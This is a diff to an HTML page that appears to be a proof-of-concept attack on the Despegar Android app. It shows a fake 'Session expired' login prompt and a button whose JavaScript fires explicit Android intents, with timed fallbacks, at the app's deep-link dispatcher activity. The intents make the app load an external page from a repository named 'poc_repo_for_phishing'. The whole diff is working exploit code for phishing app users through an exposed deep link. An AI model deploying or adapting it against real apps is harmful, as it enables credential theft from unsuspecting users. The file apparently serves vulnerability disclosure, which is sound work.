@@ -66,8 +66,31 @@
   
   <p><strong>Session expired.</strong><br>Please log in again to continue.</p>
   
-  <a class="trigger" href="intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=https://honestcorrupt.github.io/poc_repo_for_phishing//;end">
+  <!-- Updated Trigger Button -->
+  <a class="trigger" href="javascript:void(0)" onclick="triggerDespegar()">
     Open in Despegar App
   </a>
+
+  <script>
+    function triggerDespegar() {
+        const targetUrl = "https://honestcorrupt.github.io/poc_repo_for_phishing/";
+        
+        // Primary Intent
+        let intent = `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(targetUrl)};end`;
+        window.location.href = intent;
+
+        // Fallback 1 - after 500ms
+        setTimeout(() => {
+            let intent2 = `intent://despegar#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.url=${encodeURIComponent(targetUrl)};end`;
+            window.location.href = intent2;
+        }, 500);
+
+        // Fallback 2 - using deeplink key
+        setTimeout(() => {
+            let intent3 = `intent:#Intent;action=android.intent.action.VIEW;component=com.gm.despegar/com.despegar.whitelabel.app.ui.DeepLinkDispatcherActivity;S.deeplink=${encodeURIComponent(targetUrl)};end`;
+            window.location.href = intent3;
+        }, 1200);
+    }
+  </script>
 </body>
 </html>
